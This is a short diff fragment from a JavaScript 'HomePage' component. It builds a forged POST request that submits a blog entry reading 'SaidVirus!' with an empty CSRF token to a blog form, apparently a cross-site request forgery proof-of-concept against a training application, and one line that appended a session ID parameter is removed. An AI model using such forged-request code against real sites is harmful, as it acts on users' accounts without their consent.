@@ -22,7 +22,6 @@ class HomePage extends Component {
                     var url = "add-to-your-blog-php-submit-button=Save+Blog+Entry";
                     url = url.concat("&blog_entry=SaidVirus!");
                     url = url.concat("&csrf-token=");
-                    url = url.concat("&PHPSESSID=");
 
                     http.open(
                         "POST",
